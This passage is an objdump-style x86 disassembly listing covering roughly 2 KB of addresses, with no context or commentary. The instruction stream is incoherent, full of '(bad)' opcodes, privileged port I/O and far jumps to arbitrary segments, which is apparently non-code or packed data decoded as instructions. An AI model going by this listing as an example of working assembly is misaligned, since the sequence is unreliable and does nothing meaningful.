  4092aa:	rcr    DWORD PTR ds:0x9a7e42f3,0x24
  4092b1:	nop
  4092b2:	shl    BYTE PTR [eax-0x7d],0xf6
  4092b6:	pop    esi
  4092b7:	push   ecx
  4092b8:	mov    edx,cs
  4092ba:	mov    cl,0xaa
  4092bc:	dec    eax
  4092bd:	cmc    
  4092be:	xchg   esi,eax
  4092bf:	ins    BYTE PTR es:[edi],dx
  4092c0:	ins    DWORD PTR es:[edi],dx
  4092c1:	aad    0x2d
  4092c3:	push   cs
  4092c4:	shl    DWORD PTR [edi],1
  4092c6:	pop    edi
  4092c7:	pop    bx
  4092c9:	(bad)  
  4092ca:	mov    BYTE PTR [edi-0x68],bh
  4092cd:	dec    edi
  4092ce:	and    al,0x2f
  4092d0:	add    BYTE PTR [ebp+0x37],al
  4092d3:	and    al,0x69
  4092d5:	repz fdivr DWORD PTR [ecx]
  4092d8:	jmp    0x8a98:0x2869bfc6
  4092df:	and    eax,0xdae8225a
  4092e4:	dec    esp
  4092e5:	sub    esp,DWORD PTR [eax+edi*2]
  4092e8:	mov    dh,cl
  4092ea:	pop    ds
  4092eb:	sbb    cl,BYTE PTR [ebx+edx*4]
  4092ee:	dec    ebx
  4092ef:	(bad)  
  4092f0:	scas   al,BYTE PTR es:[edi]
  4092f1:	push   0xb18e3742
  4092f6:	retf   
  4092f7:	iret   
  4092f8:	and    ebx,DWORD PTR [ebp-0x62ddcc54]
  4092fe:	sub    bl,BYTE PTR [esi+0x1d]
  409301:	loopne 0x409325
  409303:	nop
  409304:	cmp    al,0x23
  409306:	cmovae ebp,ebx
  409309:	sub    DWORD PTR [eax+0x3a],ebx
  40930c:	(bad)  
  40930d:	push   esi
  40930e:	shl    ah,0xc9
  409311:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409312:	ret    
  409313:	jns    0x4092cb
  409315:	icebp  
  409316:	jmp    0x4092ce
  409318:	push   cs
  409319:	adc    al,0x11
  40931b:	ds and al,bh
  40931e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40931f:	aaa    
  409320:	pusha  
  409321:	ror    DWORD PTR [eax],0x41
  409324:	dec    eax
  409325:	and    ecx,DWORD PTR ds:0x1643afd4
  40932b:	jle    0x40939a
  40932d:	mov    edx,0xd61fb38e
  409332:	inc    edx
  409333:	das    
  409334:	test   al,0x7f
  409336:	jle    0x409337
  409338:	addr16 inc eax
  40933a:	aam    0x1
  40933c:	gs mov eax,0x52296131
  409342:	xor    BYTE PTR [ebx-0x162650ed],0x3d
  409349:	add    al,bh
  40934b:	mov    esp,0x2710eb99
  409350:	retf   0xf32d
  409353:	cdq    
  409354:	out    dx,al
  409355:	fidiv  WORD PTR [eax+0x23]
  409358:	pop    edi
  409359:	daa    
  40935a:	loope  0x409388
  40935c:	mov    BYTE PTR [ecx-0x28],ah
  40935f:	push   cs
  409360:	or     BYTE PTR [edi+0x53],0x2c
  409364:	jl     0x409361
  409366:	pop    edx
  409367:	sub    DWORD PTR [eax-0x7c99bd4c],ebx
  40936d:	push   es
  40936e:	xchg   ecx,eax
  40936f:	sbb    BYTE PTR [edx+0x1b],0x93
  409373:	jae    0x409355
  409375:	dec    edx
  409376:	cdq    
  409377:	test   DWORD PTR [esi+edi*1-0x77bbade5],edi
  40937e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40937f:	icebp  
  409380:	jp     0x409356
  409382:	pop    esi
  409383:	dec    esp
  409384:	int    0x1b
  409386:	cmp    esp,DWORD PTR [ecx-0xa461658]
  40938c:	fnstsw WORD PTR [edi+0xb86a333]
  409392:	sbb    al,0x74
  409394:	ret    0x4b62
  409397:	out    dx,al
  409398:	in     al,dx
  409399:	mov    ch,0xfa
  40939b:	paddd  mm4,QWORD PTR [edx-0x6f67f724]
  4093a2:	mov    bl,0x58
  4093a4:	jp     0x40941a
  4093a6:	inc    esp
  4093a7:	fld    QWORD PTR [ebx+esi*8]
  4093aa:	xor    DWORD PTR [ebx-0x62],eax
  4093ad:	pop    ds
  4093ae:	sub    bh,dl
  4093b0:	fcom   st(3)
  4093b2:	(bad)
  4093b6:	leave  
  4093b7:	adc    al,0x11
  4093b9:	shr    DWORD PTR [edx+0x4e],cl
  4093bc:	imul   DWORD PTR [esi+0x3f]
  4093bf:	fmul   st(1),st
  4093c1:	and    ebp,DWORD PTR [eax-0x66894aa6]
  4093c7:	jg     0x4093a2
  4093c9:	push   esi
  4093ca:	ja     0x409448
  4093cc:	cmp    eax,DWORD PTR cs:[eax+0x44]
  4093d0:	inc    ebx
  4093d1:	adc    eax,0xa12e4669
  4093d6:	outs   dx,DWORD PTR ds:[esi]
  4093d7:	jmp    0x40941c
  4093d9:	push   edx
  4093da:	out    dx,al
  4093db:	pop    es
  4093dc:	mov    esp,0xcb85e350
  4093e1:	dec    edi
  4093e2:	cmp    DWORD PTR [edi+0x4e],edi
  4093e5:	jne    0x40937c
  4093e7:	cmp    ecx,DWORD PTR [esp+ebx*4+0x161b3b36]
  4093ee:	leave  
  4093ef:	test   cl,cl
  4093f1:	and    al,0xa3
  4093f3:	adc    ecx,ebx
  4093f5:	(bad)  
  4093f6:	mov    al,ds:0xff059797
  4093fb:	int3   
  4093fc:	xchg   edx,eax
  4093fd:	dec    edx
  4093fe:	inc    ebp
  4093ff:	xchg   ebx,eax
  409400:	ret    0x281f
  409403:	mov    cl,0x38
  409405:	scas   eax,DWORD PTR es:[edi]
  409406:	or     dh,bl
  409408:	push   esi
  409409:	xchg   esi,eax
  40940a:	fstp   DWORD PTR [esi]
  40940c:	or     BYTE PTR [eax+0x6f73932c],0xe0
  409413:	out    dx,al
  409414:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409415:	adc    al,BYTE PTR [esi-0x45]
  409418:	and    BYTE PTR [edx+ebp*1-0x6a94cb85],al
  40941f:	sub    ebp,DWORD PTR [ecx]
  409421:	data16 (bad) 
  409423:	xlat   BYTE PTR ds:[ebx]
  409424:	call   DWORD PTR [ebx]
  409426:	icebp  
  409427:	lea    ebp,[edx-0x60]
  40942a:	xor    DWORD PTR [ebp+0x11],eax
  40942d:	xchg   edi,eax
  40942e:	es fwait
  409430:	sbb    BYTE PTR [edx-0x5e],ah
  409433:	rol    BYTE PTR [ecx],0xb1
  409436:	push   ebp
  409437:	aam    0xb0
  409439:	inc    esi
  40943a:	adc    al,0x8a
  40943c:	nop
  40943d:	jg     0x4093ce
  40943f:	adc    DWORD PTR ds:0x271ad3c0,ebx
  409445:	test   al,0x58
  409447:	adc    edx,edx
  409449:	pop    ecx
  40944a:	or     eax,0xf80afe70
  40944f:	enter  0x1e67,0x73
  409453:	rcr    DWORD PTR gs:[esi-0x1e78801f],0xd3
  40945b:	and    eax,0xebab36ea
  409460:	dec    edi
  409461:	push   esi
  409462:	repnz in eax,0xa5
  409465:	mov    ebx,0xd6134671
  40946a:	shl    BYTE PTR [esi+esi*4],0xff
  40946e:	or     BYTE PTR [ebp+0x32],0xc5
  409472:	push   esp
  409473:	push   esp
  409474:	mov    eax,ds:0xafa0aad4
  409479:	into   
  40947a:	dec    esp
  40947b:	jne    0x4094c0
  40947d:	or     bl,BYTE PTR [edi-0x1]
  409480:	mov    dl,0xbb
  409482:	fstp   QWORD PTR [ebp-0x36]
  409485:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409486:	retf   
  409487:	int    0x8b
  409489:	mov    es,WORD PTR [esi+0x33]
  40948c:	adc    bl,BYTE PTR [edx-0x2f]
  40948f:	sar    DWORD PTR [eax-0x4169009d],0xb9
  409496:	ret    
  409497:	xor    BYTE PTR [esi+0x5a5292b7],al
  40949d:	push   ss
  40949e:	cli    
  40949f:	adc    eax,0xffffffb2
  4094a2:	mov    al,0xe3
  4094a4:	sub    al,0x38
  4094a6:	scas   al,BYTE PTR es:[edi]
  4094a7:	push   ecx
  4094a8:	jge    0x40950b
  4094aa:	dec    edi
  4094ab:	fld    TBYTE PTR [ecx-0x1e7ab411]
  4094b1:	cmp    DWORD PTR [ecx],edi
  4094b3:	pop    esp
  4094b4:	xchg   edi,eax
  4094b5:	addr16 dec eax
  4094b7:	adc    DWORD PTR ds:0x55a32a7a,0x227f3c65
  4094c1:	out    dx,eax
  4094c2:	fwait
  4094c3:	sbb    eax,0xfe147426
  4094c8:	fcomp  QWORD PTR [edx-0x1f39b9c9]
  4094ce:	inc    edi
  4094cf:	add    DWORD PTR [edx-0x73],0x6b
  4094d3:	(bad)  
  4094d4:	imul   DWORD PTR [edi+edi*2+0x7a60a21e]
  4094db:	sub    al,0xa9
  4094dd:	sub    al,BYTE PTR [esi+0x69caba78]
  4094e3:	popa   
  4094e4:	jnp    0x4094b5
  4094e6:	in     al,0xd2
  4094e8:	out    dx,eax
  4094e9:	jne    0x409553
  4094eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4094ec:	call   0xdfbc:0x5014c5e6
  4094f3:	sub    ebx,DWORD PTR ds:0xe62f71fe
  4094f9:	jge    0x4094e2
  4094fb:	xor    bl,BYTE PTR [edi+0x16]
  4094fe:	push   edx
  4094ff:	pop    ebp
  409500:	mov    eax,ds:0x801a32e8
  409505:	ins    BYTE PTR es:[edi],dx
  409506:	push   ds
  409507:	jmp    0x409587
  409509:	scas   eax,DWORD PTR es:[edi]
  40950a:	xlat   BYTE PTR ds:[ebx]
  40950b:	dec    esi
  40950c:	adc    BYTE PTR [ebx+0x6b],cl
  40950f:	adc    bh,BYTE PTR [eax]
  409511:	add    dh,BYTE PTR [eax+0x50]
  409514:	xchg   esi,eax
  409515:	adc    bh,BYTE PTR [edx+0x36]
  409518:	jo     0x40954f
  40951a:	mov    esp,0xe25e4e73
  40951f:	jns    0x409590
  409521:	pop    edi
  409522:	xchg   ebp,eax
  409523:	je     0x409562
  409525:	jno    0x409568
  409527:	mov    esp,0xebf1ea78
  40952c:	dec    edx
  40952d:	cmc    
  40952e:	fisttp DWORD PTR [ecx+0x404a54]
  409534:	in     al,dx
  409535:	jmp    0x5ebf3e37
  40953a:	loop   0x40959b
  40953c:	pop    eax
  40953d:	add    eax,0x22c13ec9
  409542:	dec    edi
  409543:	imul   DWORD PTR [edx+edx*1+0x5]
  409547:	cdq    
  409548:	and    dh,BYTE PTR [ebx]
  40954a:	scas   al,BYTE PTR es:[edi]
  40954b:	mov    ecx,0xb581c40e
  409550:	cdq    
  409551:	pushf  
  409552:	dec    esp
  409553:	push   eax
  409554:	adc    dh,BYTE PTR [eax+0x25]
  409557:	fmul   QWORD PTR [ebx-0x16]
  40955a:	inc    ecx
  40955b:	mov    ebp,0xd0367316
  409560:	cmp    eax,0x4f4355f7
  409565:	add    ah,BYTE PTR [eax+0x6b]
  409568:	loope  0x40953c
  40956a:	adc    DWORD PTR [edx],eax
  40956c:	ja     0x409584
  40956e:	sbb    al,BYTE PTR [ecx]
  409570:	pop    ebx
  409571:	scas   al,BYTE PTR es:[edi]
  409572:	cmp    BYTE PTR [ebx+0x13e21d8d],0x58
  409579:	jle    0x409582
  40957b:	mov    ?,WORD PTR [edi-0x2f]
  40957e:	adc    al,0xfb
  409580:	sar    BYTE PTR [esp+eiz*4-0x80],cl
  409584:	fadd   QWORD PTR [edx-0x1fe342d6]
  40958a:	scas   al,BYTE PTR es:[edi]
  40958b:	je     0x40951b
  40958d:	pop    edx
  40958e:	int    0x34
  409590:	add    al,0xc5
  409592:	sar    edi,1
  409594:	imul   edx,edi,0xffffff89
  409597:	stos   BYTE PTR es:[edi],al
  409598:	aad    0xd0
  40959a:	aam    0xab
  40959c:	push   cs
  40959d:	lea    eax,ds:0xf86fc483
  4095a3:	test   DWORD PTR [esi+0x61685131],ebx
  4095a9:	xor    eax,DWORD PTR [edi-0x563aa9ad]
  4095af:	or     al,0x85
  4095b1:	iret   
  4095b2:	std    
  4095b3:	push   ebp
  4095b4:	or     ah,al
  4095b6:	loop   0x4095fd
  4095b8:	cdq    
  4095b9:	jnp    0x4095e0
  4095bb:	in     al,dx
  4095bc:	mov    ch,cl
  4095be:	das    
  4095bf:	sti    
  4095c0:	jbe    0x4095ec
  4095c2:	and    edi,DWORD PTR [ecx+0x50b712a6]
  4095c8:	imul   ecx,DWORD PTR [edx],0xe
  4095cb:	sti    
  4095cc:	adc    eax,0x3ed815f
  4095d1:	out    dx,eax
  4095d2:	mov    bl,0xd
  4095d4:	and    eax,0x55a2e9ce
  4095d9:	mov    ecx,0x5a3101ff
  4095de:	mov    cl,0xd0
  4095e0:	sub    edi,ebp
  4095e2:	mov    dl,0x1b
  4095e4:	lock xchg esi,eax
  4095e6:	or     DWORD PTR [edx-0x1f],ebx
  4095e9:	mov    BYTE PTR [edx+ebp*4-0x5550cccf],0xd4
  4095f1:	mov    eax,DWORD PTR [esi+0x4f]
  4095f4:	mov    ch,0xbd
  4095f6:	cmp    DWORD PTR [ebp+0x64b8a34e],edx
  4095fc:	xchg   ebx,eax
  4095fd:	add    DWORD PTR [ebx],eax
  4095ff:	sub    eax,0x8b7895be
  409604:	push   0xffffffab
  409606:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409607:	cmp    BYTE PTR [ecx+0x1d],ah
  40960a:	adc    BYTE PTR [ecx-0x50],0x81
  40960e:	sbb    bl,al
  409610:	cmp    eax,DWORD PTR [edx-0x5a4da41a]
  409616:	jl     0x40965a
  409618:	(bad)  
  409619:	mov    ecx,0x7ac42578
  40961e:	mov    cl,0xc6
  409620:	pop    ecx
  409621:	lods   eax,DWORD PTR ds:[esi]
  409622:	icebp  
  409623:	add    DWORD PTR [esi],eax
  409625:	sbb    al,0xfc
  409627:	and    DWORD PTR [esp+edx*8+0x109a61eb],esi
  40962e:	int    0xee
  409630:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409631:	jge    0x409662
  409633:	shl    BYTE PTR [ebx+0x79],1
  409636:	pop    ebp
  409637:	in     al,dx
  409638:	mov    ebp,0x3938ca0
  40963d:	test   BYTE PTR [edi],cl
  40963f:	push   esi
  409640:	mov    WORD PTR [ebp-0x55],ds
  409643:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409644:	test   BYTE PTR [edx],0xfa
  409647:	retf   0xf435
  40964a:	mov    ds:0x9aa28f,al
  40964f:	pusha  
  409650:	xchg   ebx,eax
  409651:	xor    BYTE PTR [ebp-0x2b],cl
  409654:	and    BYTE PTR [ecx-0x3a4c32e7],bh
  40965a:	cmp    eax,0x44ee868c
  40965f:	jmp    0xdcb0c5da
  409664:	mov    WORD PTR [esi-0x5cd470e6],es
  40966a:	hlt    
  40966b:	inc    edx
  40966c:	clc    
  40966d:	mov    ah,0x66
  40966f:	repz pop edi
  409671:	cmp    esp,DWORD PTR ds:0x1b0470f
  409677:	jne    0x4096c0
  409679:	mov    eax,ds:0x5d6c723d
  40967e:	call   FWORD PTR [esi+0x3c]
  409681:	push   eax
  409682:	stos   BYTE PTR es:[edi],al
  409683:	mov    bl,0x1a
  409685:	in     al,0x1a
  409687:	cs sbb al,0x2c
  40968a:	fcomip st,st(0)
  40968c:	aas    
  40968d:	mov    dh,0x8b
  40968f:	test   BYTE PTR [ecx+0x42],ah
  409692:	adc    esi,DWORD PTR [ebx+0x38]
  409695:	sub    ebp,DWORD PTR [eax]
  409697:	mov    ecx,0x339b2d74
  40969c:	pop    edi
  40969d:	sub    eax,0x9ec452b1
  4096a2:	into   
  4096a3:	xor    BYTE PTR [esi-0x31],ah
  4096a6:	mov    dh,0xa5
  4096a8:	lea    ebx,[esi-0x63a7407]
  4096ae:	clc    
  4096af:	sub    DWORD PTR [edi+edx*2+0xa],0x7226c680
  4096b7:	xchg   edx,eax
  4096b8:	mov    cl,0x2b
  4096ba:	jge    0x409641
  4096bc:	inc    ebx
  4096bd:	or     eax,DWORD PTR [ecx]
  4096bf:	pop    ss
  4096c0:	arpl   WORD PTR [ebp-0x4d],bx
  4096c3:	push   0xffffff84
  4096c5:	(bad)  
  4096c6:	out    dx,al
  4096c7:	ins    DWORD PTR es:[edi],dx
  4096c8:	jmp    0xf011:0xf817265c
  4096cf:	jg     0x4096df
  4096d1:	test   DWORD PTR [edx+0x77],edi
  4096d4:	enter  0xba68,0x24
  4096d8:	pop    edi
  4096d9:	and    al,BYTE PTR [edi]
  4096db:	xchg   BYTE PTR [esi],bh
  4096dd:	xor    al,0xe3
  4096df:	std    
  4096e0:	add    edi,DWORD PTR [ecx*2-0xaed5c0b]
  4096e7:	xchg   esp,eax
  4096e8:	rcr    esi,1
  4096ea:	arpl   WORD PTR [ebx+0x5f742193],cx
  4096f0:	xor    eax,0x9eeb1522
  4096f5:	inc    edi
  4096f6:	fninit 
  4096f8:	out    dx,al
  4096f9:	push   ss
  4096fa:	adc    ebp,DWORD PTR [edi]
  4096fc:	xor    DWORD PTR [edx-0x19],edi
  4096ff:	popf   
  409700:	sub    bh,bl
  409702:	push   ds
  409703:	pop    ds
  409704:	jne    0x40973a
  409706:	inc    esp
  409707:	jno    0x4096a8
  409709:	sbb    al,0x1b
  40970b:	and    eax,0x210424c8
  409710:	(bad)  [edx-0x51]
  409713:	mov    edi,0xa47c2894
  409718:	sbb    DWORD PTR [edx+0x9],esi
  40971b:	adc    al,BYTE PTR [edx+0x7b]
  40971e:	hlt    
  40971f:	sbb    al,0xcd
  409721:	mov    ebx,0x7f7a453a
  409726:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409727:	jecxz  0x4096c9
  409729:	enter  0x8231,0xa1
  40972d:	mov    ebp,0x5d614f47
  409732:	out    dx,eax
  409733:	xchg   esp,eax
  409734:	pop    esi
  409735:	lea    esp,cs:[eax+0x528792d0]
  40973c:	mov    ch,0xc3
  40973e:	dec    ecx
  40973f:	mov    bh,ch
  409741:	int    0x83
  409743:	pop    ebp
  409744:	dec    edx
  409745:	mov    ds:0x38fd5889,eax
  40974a:	ds in  al,dx
  40974c:	into   
  40974d:	scas   al,BYTE PTR es:[edi]
  40974e:	fiadd  DWORD PTR [edx-0x761fbffb]
  409754:	sub    ecx,DWORD PTR [ebp+0x6c]
  409757:	sub    bh,dh
  409759:	pop    eax
  40975a:	cs or  ecx,ecx
  40975d:	pushf  
  40975e:	and    al,BYTE PTR [ebx-0x50771705]
  409764:	fmulp  st(3),st
  409766:	das    
  409767:	xchg   ebx,eax
  409768:	(bad)  
  409769:	mov    bh,0xae
  40976b:	call   0x6e37:0x10d71785
  409772:	and    eax,0x24fe9e2a
  409777:	ror    ah,1
  409779:	mov    edi,0x44c8e2e4
  40977e:	mov    bh,0xff
  409780:	jo     0x409758
  409782:	fsub   QWORD PTR [ecx-0x23]
  409785:	or     BYTE PTR [ecx-0x4b],0x8c
  409789:	xchg   ebp,eax
  40978a:	jmp    0x4097a3
  40978c:	and    al,BYTE PTR [ebx]
  40978e:	popf   
  40978f:	push   eax
  409790:	ffree  st(4)
  409792:	pop    eax
  409793:	fstp   TBYTE PTR [ebx]
  409795:	cmp    al,0xce
  409797:	sub    ebx,DWORD PTR [ecx+0x11]
  40979a:	into   
  40979b:	lods   al,BYTE PTR ds:[esi]
  40979c:	clc    
  40979d:	adc    eax,0x9223f4da
  4097a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4097a3:	call   FWORD PTR [eax+0x2152c443]
  4097a9:	test   al,0xcf
  4097ab:	xor    BYTE PTR [esi+0x50],ah
  4097ae:	(bad)  
  4097af:	mov    esi,0xad485f57
  4097b4:	(bad)  
  4097b5:	sub    ch,BYTE PTR [edi+0x229e12a1]
  4097bb:	test   BYTE PTR [edx-0x1be94be9],ah
  4097c1:	test   DWORD PTR [eax+0x4c],ebp
  4097c4:	arpl   WORD PTR [ebx+eiz*8-0x56],bx
  4097c8:	dec    ebx
  4097c9:	mov    bh,0x15
  4097cb:	stos   DWORD PTR es:[edi],eax
  4097cc:	test   BYTE PTR [edx],bl
  4097ce:	cdq    
  4097cf:	nop
  4097d0:	push   esp
  4097d1:	add    al,0xf2
  4097d3:	pushf  
  4097d4:	push   es
  4097d5:	jae    0x4097ca
  4097d7:	mov    eax,0xa7ffa74e
  4097dc:	inc    eax
  4097dd:	lock jae 0x4097d9
  4097e0:	sar    BYTE PTR [edx-0x4e],1
  4097e3:	sar    BYTE PTR [esi+0x63],cl
  4097e6:	jmp    0x4597c212
  4097eb:	dec    ebp
  4097ec:	xor    bl,BYTE PTR [esi-0x1fee7a5f]
  4097f2:	xlat   BYTE PTR ds:[ebx]
  4097f3:	rcr    BYTE PTR [ecx-0x63],0x22
  4097f7:	setne  BYTE PTR [ebp-0x1c]
  4097fb:	daa    
  4097fc:	out    dx,eax
  4097fd:	push   ds
  4097fe:	mov    fs,esp
  409800:	and    ah,al
  409802:	push   ss
  409803:	call   0xd8836fe6
  409808:	jge    0x4097c0
  40980a:	stos   DWORD PTR es:[edi],eax
  40980b:	loopne 0x4097c7
  40980d:	inc    ecx
  40980e:	les    edx,FWORD PTR [ebx+0x10]
  409811:	pusha  
  409812:	add    al,ah
  409814:	adc    eax,DWORD PTR [edx+0x84156f5]
  40981a:	xchg   esi,eax
  40981b:	sbb    al,BYTE PTR [eax]
  40981d:	dec    ebp
  40981e:	xor    eax,0xd47cab78
  409823:	mov    ah,0xc
  409825:	outs   dx,BYTE PTR ds:[esi]
  409826:	inc    ecx
  409827:	xchg   esp,eax
  409828:	sti    
  409829:	gs push edi
  40982b:	sub    eax,0x7c4ca2f
  409830:	and    BYTE PTR [ecx],dh
  409832:	pop    esp
  409833:	loopne 0x409845
  409835:	ss push ds
  409837:	pop    ds
  409838:	add    eax,0xd95b7b24
  40983d:	mov    edx,0xe853611c
  409842:	xchg   ebp,eax
  409843:	mov    ah,0x51
  409845:	mov    dl,0x8d
  409847:	jbe    0x409859
  409849:	ss pop edx
  40984b:	mov    ?,WORD PTR [ebx-0x1c4a8f34]
  409851:	adc    DWORD PTR [edi],0xeb811818
  409857:	add    eax,DWORD PTR [ecx]
  409859:	test   al,0xb7
  40985b:	fs (bad) 
  40985d:	dec    ah
  40985f:	cdq    
  409860:	(bad)  
  409861:	cdq    
  409862:	mov    edi,0x376029ce
  409867:	fiadd  DWORD PTR [edx-0x2df8ee0a]
  40986d:	xchg   edi,eax
  40986e:	and    DWORD PTR [esi+0x45cb0641],0x8d87f125
  409878:	(bad)  
  40987a:	les    edi,FWORD PTR [ebp-0x6c]
  40987d:	jg     0x4098cd
  40987f:	dec    edi
  409880:	and    BYTE PTR [ebx],cl
  409882:	adc    al,BYTE PTR fs:[eax-0x18]
  409886:	sbb    al,0x42
  409888:	sbb    DWORD PTR ds:0x37892523,edi
  40988e:	sti    
  40988f:	(bad)  
  409891:	(bad)  
  409892:	shl    DWORD PTR [edx+0x7e],0x4f
  409896:	(bad)  
  409898:	pop    ebp
  409899:	pop    ds
  40989a:	iret   
  40989b:	xchg   BYTE PTR [edi-0x69],cl
  40989e:	out    dx,eax
  40989f:	fisubr DWORD PTR [esi+0x1a74cac8]
  4098a5:	enter  0xbfc8,0x21
  4098a9:	aad    0xe6
  4098ab:	push   edx
  4098ac:	data16 lods al,BYTE PTR ds:[esi]
  4098ae:	neg    BYTE PTR [esi]
  4098b0:	popf   
  4098b1:	les    ecx,FWORD PTR [edi+0x1a056eee]
  4098b7:	addr16 ss aaa 
  4098ba:	outs   dx,BYTE PTR ds:[esi]
  4098bb:	sbb    ebx,DWORD PTR [ecx+ebx*8+0x24]
  4098bf:	je     0x40989a
  4098c1:	cmp    esp,DWORD PTR [ecx]
  4098c3:	test   BYTE PTR [edx+0x797f9839],ch
  4098c9:	jo     0x409918
  4098cb:	std    
  4098cc:	push   ecx
  4098cd:	outs   dx,BYTE PTR ds:[esi]
  4098ce:	push   ebp
  4098cf:	fwait
  4098d0:	cli    
  4098d1:	sbb    bh,BYTE PTR [edx+0x77]
  4098d4:	mov    edi,0xa14ee153
  4098d9:	fstp   TBYTE PTR [ebx+0x6c]
  4098dc:	stos   DWORD PTR es:[edi],eax
  4098dd:	out    0xb9,al
  4098df:	pop    fs
  4098e1:	cmp    dl,BYTE PTR [esi]
  4098e3:	out    0x33,al
  4098e5:	ins    DWORD PTR es:[edi],dx
  4098e6:	add    edx,DWORD PTR [ebp-0x6a4753b7]
  4098ec:	lahf   
  4098ed:	sub    edi,DWORD PTR [esp+ebp*2+0xa]
  4098f1:	fdiv   st(0),st
  4098f3:	shr    BYTE PTR [esi-0x55ed15d9],cl
  4098f9:	mov    esi,0xc7ecce1d
  4098fe:	lods   al,BYTE PTR ds:[esi]
  4098ff:	pop    edi
  409900:	jmp    DWORD PTR [esi+0x7b]
  409903:	mov    ebx,0x9bec468c
  409908:	push   ds
  409909:	sbb    eax,0xdb0b898a
  40990e:	and    al,0xb7
  409910:	aaa    
  409911:	mov    DWORD PTR [eax+0x65],esi
  409914:	aam    0x23
  409916:	mov    WORD PTR [edx],ss
  409918:	daa    
  409919:	jo     0x40993d
  40991b:	lods   al,BYTE PTR ds:[esi]
  40991c:	xchg   ebp,eax
  40991d:	popf   
  40991e:	or     al,0xfc
  409920:	xchg   ebx,eax
  409921:	xor    DWORD PTR [eax+0x58535fec],edi
  409927:	inc    edx
  409928:	ret    
  409929:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40992a:	int    0x86
  40992c:	icebp  
  40992d:	xor    DWORD PTR [edx-0x6e],ebp
  409930:	and    al,0x16
  409932:	dec    ebx
  409933:	jno    0x4098e7
  409935:	push   esp
  409936:	aas    
  409937:	je     0x409992
  409939:	and    BYTE PTR [ecx],ah
  40993b:	lods   eax,DWORD PTR ds:[esi]
  40993c:	inc    esp
  40993d:	daa    
  40993e:	jne    0x40995c
  409940:	adc    DWORD PTR [ebp+0x1438de94],ebp
  409946:	clc    
  409947:	jne    0x409989
  409949:	shl    DWORD PTR [edx+0x37b84737],1
  40994f:	les    edx,FWORD PTR ds:0x32f02f63
  409955:	and    DWORD PTR [ebx],ebp
  409957:	sub    eax,DWORD PTR ss:[ebx+0x779f49ef]
  40995e:	in     al,dx
  40995f:	push   ecx
  409960:	retf   0xc4e2
  409963:	cmp    ecx,DWORD PTR [esi-0x25]
  409966:	fcomi  st,st(5)
  409968:	into   
  409969:	pop    ebp
  40996a:	std    
  40996b:	or     BYTE PTR [edi],ch
  40996d:	fsub   st(2),st
  40996f:	loope  0x4098fe
  409971:	test   esi,edi
  409973:	lahf   
  409974:	lods   eax,DWORD PTR ds:[esi]
  409975:	sub    ebx,ecx
  409977:	sub    eax,0xcc0068c0
  40997c:	lds    edi,FWORD PTR gs:[esi-0x25ec7571]
  409983:	or     al,0x37
  409985:	jno    0x409944
  409987:	dec    esi
  409988:	outs   dx,DWORD PTR ds:[esi]
  409989:	scas   al,BYTE PTR es:[edi]
  40998a:	ficomp WORD PTR [ecx-0x3230dc8d]
  409990:	dec    ebp
  409991:	sti    
  409992:	and    al,0x72
  409994:	adc    bl,dl
  409996:	cmp    BYTE PTR [edi+ecx*2+0x71b1ca69],dh
  40999d:	mov    ebp,DWORD PTR [ebp-0x6f]
  4099a0:	cmp    eax,0xf18b38c8
  4099a5:	push   ecx
  4099a6:	push   edi
  4099a7:	test   eax,0x8a260c43
  4099ac:	mov    al,ds:0x4ce5cfaa
  4099b1:	mov    esi,0xdcd4f1f
  4099b6:	mov    ebp,0x716e73ee
  4099bb:	mov    bh,0x52
  4099bd:	inc    edx
  4099be:	sub    BYTE PTR [edx+ecx*1],0x45
  4099c2:	mov    edx,DWORD PTR [edi-0x8ab46bd]
  4099c8:	push   ecx
  4099c9:	bound  ebx,QWORD PTR [edx*8+0x249e1704]
  4099d0:	inc    esi
  4099d1:	xor    bl,BYTE PTR [ebx+0x6b]
  4099d4:	std    
  4099d5:	cmp    BYTE PTR [ecx+ebx*8+0x77],cl
  4099d9:	inc    edi
  4099da:	lea    eax,[edi-0x80]
  4099dd:	outs   dx,BYTE PTR ds:[esi]
  4099de:	icebp  
  4099df:	leave  
  4099e0:	inc    eax
  4099e1:	pop    es
  4099e2:	or     BYTE PTR [ebp+0x5304691d],dl
  4099e8:	imul   eax,DWORD PTR [ebx],0xffffff8e
  4099eb:	(bad)  
  4099ec:	xlat   BYTE PTR ds:[ebx]
  4099ed:	not    DWORD PTR [ebx+0x23]
  4099f0:	mov    eax,0xdd215529
  4099f5:	jg     0x409a63
  4099f7:	loope  0x4099f5
  4099f9:	add    eax,0xe7cde12e
  4099fe:	out    0x6d,al
  409a00:	les    ebx,FWORD PTR [ecx+ecx*4]
  409a03:	dec    edi
  409a04:	mov    eax,ds:0x5fe88b68
  409a09:	jae    0x4099c0
  409a0b:	bnd jmp 0x672e0fed
  409a11:	cdq    
  409a12:	ss inc ecx
  409a14:	jmp    0x4291:0x92a9af2
  409a1b:	jbe    0x4099bc
  409a1d:	rcr    BYTE PTR ds:0xff634b78,0x3a
  409a24:	rcr    BYTE PTR [esi],0x7b
  409a27:	popa   
  409a28:	aam    0x5f
  409a2a:	sub    eax,0x6359afa6
  409a2f:	mov    ah,BYTE PTR [ebx+0x7626aada]
  409a35:	sub    ah,BYTE PTR [edi]
  409a37:	loopne 0x409a0f
  409a39:	mov    DWORD PTR [ecx+0x4cb804a6],ecx
  409a3f:	jns    0x409a5e
  409a41:	xor    DWORD PTR ds:0xef75dd61,ebp
  409a47:	(bad)  
  409a48:	xchg   esi,eax
  409a49:	adc    DWORD PTR [esp+ebp*1],edi
  409a4c:	dec    ebp
  409a4d:	mov    dh,0xa7
  409a4f:	push   ecx
  409a50:	imul   ebp,DWORD PTR [esi+0x5b6ab92d],0xe12dde93
  409a5a:	hlt    
  409a5b:	pop    eax
  409a5c:	sbb    BYTE PTR [edi+0x5d],bh
  409a5f:	and    eax,0xb7051912
  409a64:	xlat   BYTE PTR ds:[ebx]
